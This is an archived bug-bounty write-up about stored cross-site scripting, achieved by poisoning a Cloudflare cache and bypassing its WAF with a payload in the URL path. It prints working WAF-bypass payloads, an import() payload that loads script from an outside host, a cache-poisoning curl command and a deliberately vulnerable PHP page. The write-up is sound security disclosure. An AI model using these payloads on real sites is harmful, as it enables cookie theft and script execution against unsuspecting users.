# Cross-Site Scripting via Web Cache Poisoning and WAF bypass

- **Source URL:** https://ltsirkov.medium.com/cross-site-scripting-via-web-cache-poisoning-and-waf-bypass-6cb3412d9e11?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20251218030945/https://ltsirkov.medium.com/cross-site-scripting-via-web-cache-poisoning-and-waf-bypass-6cb3412d9e11
- **Fetched:** 2026-11-27
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/6435 (id 6435)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Cross-Site Scripting via Web Cache Poisoning and WAF bypass

A few months ago, I found Cross-Site Scripting vulnerability on a private bug bounty program that I’d like to write about.

Exploiting this vulnerability required bypassing **Cloudflare WAF** and additional restriction of characters implemented on the application level.

Furthermore, the most important part was to leverage Cloudflare cache in such a way so that I can poison it with a malicious payload.

As a result of this attack chain, I managed to exploit other users by sending a specifically crafted URL that was poisoned beforehand.

**Note:** I’ll be using testing environment which I created for that blog post so that I don’t disclose the target and also if you want you would be able to play with vulnerable environment.

## Technical Details

While reading the documentation on [https://redacted.com](https://redacted.com) about how a specific functionality works, I came across the following URL there:

https://xss.2n.wtf/points/1234

After examining the page’s source code, I observed that the “**points**” value was reflected within the canonical “**og:url**” meta tag.

*og:url — The canonical URL of your object that will be used as its permanent ID in the graph, e.g., “https://www.imdb.com/title/tt0117500/".*

[https://ogp.me/#:\~:text=og%3Aurl%20%2D%20The%20canonical%20URL,%2Ftitle%2Ftt0117500%2F%22](https://ogp.me/#:~:text=og%3Aurl%20%2D%20The%20canonical%20URL,%2Ftitle%2Ftt0117500%2F%22).

Along with the reflection on the “**og:url”**, I also noticed that the page was cached by Cloudflare.

Having the reflection on “**og:url**” and the cache mechanism in place, I tried to send **double quotes** via my browser to see if I can achieve XSS.

I pasted the following payload through the browser: “[https://xss.2n.wtf/points/1234](https://redacted.com/points/1234)”", which resulted in the specified value being echoed on the page:

This indicated that XSS might not be possible, as it appeared the value was URL encoded “**%22**”.

However, I decided to dig deeper. I chose to investigate further, considering the injection point was within the **URL path**, which is typically encoded by the browser before reaching the web server.

To check that, I did the following tests:

**Request 1: \[Browser\]**https://xss.2n.wtf/points/test"

**Request 2: \[BurpSuite\]**

[https://xss.2n.wtf/points/test](https://xss.2n.wtf/points/test)"

**Request 2: \[BurpSuite\]\[Result\]**

The screenshots clearly show that the value was reflected without URL encoding on “**Request 2”** , confirming my earlier suspicions.

However, a problem came up at this point. I couldn’t send the payload to other users because browsers would encode **“** character in the GET request, making it impossible to exploit others.

### Cache Poisoning

Cloudflare’s caching mechanism came to the rescue here. What I could do is sending a request through Burp Suite so that the decoded version of the payload could be cached.

Therefore, when someone visits “**/points/test%22**” even with their browser, they are presented with the decoded **payload that was cache poisoned by** my burpsuite, facilitating the exploitation of others.

This process works because we first cache the malicious payload using Burp Suite.

Caching the payload directly through a browser isn’t possible, as the browser would URL encode it and cache encoded version.

The reason for this behaviour is that Cloudflare **in this case** treats equal “ and %22 which I was able to achieve only with specific configuration on my cloudflare account with workers. I tried to play with default Normalization settings in Cloudflare, but it didn’t work.

**Exploitation**

The strategy involves using Burp Suite or curl to send a request containing our payload, which Cloudflare will then cache and returned to our intended victim.

Simply, what we do here is:

Now confirm that via opening our browser:

**Response Headers Browser:**

As I already mentioned, the most important step is to cache the malicious payload via BurpSuite or CURL, otherwise it would cache URL encoded version of the payload.

An example with trying to cache it via the browser directly:

Which clearly shows that the payload is URL encoded.

The next step will show the method I used to construct the malicious payload.

### Web Application Firewall

Attempting to submit the payload shown below resulted in an immediate block by the **web application firewall**.

“>\<script>alert(1);\</script>

After dedicating some time to bypass the **Cloudflare WAF**, I succeeded in getting the following payload to work:

`GET /points/"><img/src=x/onerro=6><img/src="1"/onerror=alert(1);>?test=test HTTP/2`
Following that, I accessed the same URL through the browser, and it was successfully executed.

At this point, I confirmed the presence of an XSS vulnerability and could trigger an alert. Yet, to demonstrate its potential impact, I wanted to load external JavaScript from my server, https://\<your.xss.hunter>

### Bypassing limited characters

Here, I encountered another hurdle. The payload (within the URL path) could not include the following characters or elements:

1. The colon :
2. Uppercase Letters

It was some kind of additional protection after WAF bypass. But, after spending some time on trying to bypass it, I managed to achieve the following:

**On the next screenshot can be seen what characters were deleted or changed :**

I was unable to load external JavaScript on the real target due to **URI schema** constraints and character limitations. Functions such as **base64 encode/decode** were also unusable, as the payload was automatically converted to lowercase.

### Solution

To bypass these restrictions, I placed my payload within a random GET parameter, subsequently incorporating it into an import function:

`https://xss.2n.wtf/points/"><img/src=x/onerro=6><img/src="1"/onerror=import(location.search.split("aa=").pop());>?source=web-linaka&aa=https://xss.hunter`
By using Burp Suite, the payload was successfully cached by Cloudflare. I then accessed the following URL in my browser to trigger the exploit.

### Sending the payload to the victim

After analysis of the caching mechanism, I found out that it operates on a per-region basis. This means that if I wanted to send XSS to other users, I had to poison the cache in different regions beforehand.

For the demonstration of my proof of concept, I targeted the cache associated with **Sofia, Bulgaria**. This demonstrated how, once the cache is poisoned, the payload can be triggered on a variety of devices within this locale.

### Simple Steps to Reproduce

1. Run CURL command:

`curl -i "https://xss.2n.wtf/points/\"><img/src=x/onerro=6><img/src=\"1\"/onerror=alert(1);>1"`
2\. Open browser and visit

`https://xss.2n.wtf/points/%22%3E%3Cimg/src=x/onerro=6%3E%3Cimg/src=%221%22/onerror=alert(1);%3E1`
3\. Send URL to the victim who needs to be in same poisoned location.

### PoC Environment

On my environment, the following source is hosted that is similar to the real environment: [https://xss.2n.wtf](https://xss.2n.wtf.)/ — You can reproduce the mentioned behaviour there.

```
<?php header('HTTP/1.0 404 Not Found'); ?>
<html prefix="og: https://ogp.me/ns#">
<head>
<title>PoC Redacted</title>
<meta property="og:title" content="The Rock" />
<meta property="og:type" content="video.movie" />
<meta property="og:url" content="<?php echo $_SERVER['REQUEST_URI']; ?>" />
<meta property="og:image" content="https://ia.media-imdb.com/images/rock.jpg" />
</head>
<body>
PoC <pre>$_SERVER['REQUEST_URI'];</pre>
</body>
</html>
```
So, by using **REQUEST\_URI** and specific Cloudflare configuration, it might produce interesting results.

I reproduced it only with Cloudflare, but feel free to reach out for further research.

### Impact

An attacker can inject a Cross-Site Scripting (XSS) payload through Cache Poisoning and bypass Web Application Firewall (WAF) protections. This method allows the delivery of the malicious payload to victims in various ways.

Once delivered to the victim, this payload grants the attacker the ability to steal cookies and execute arbitrary JavaScript code on the victim’s browser.

Thanks for reading.
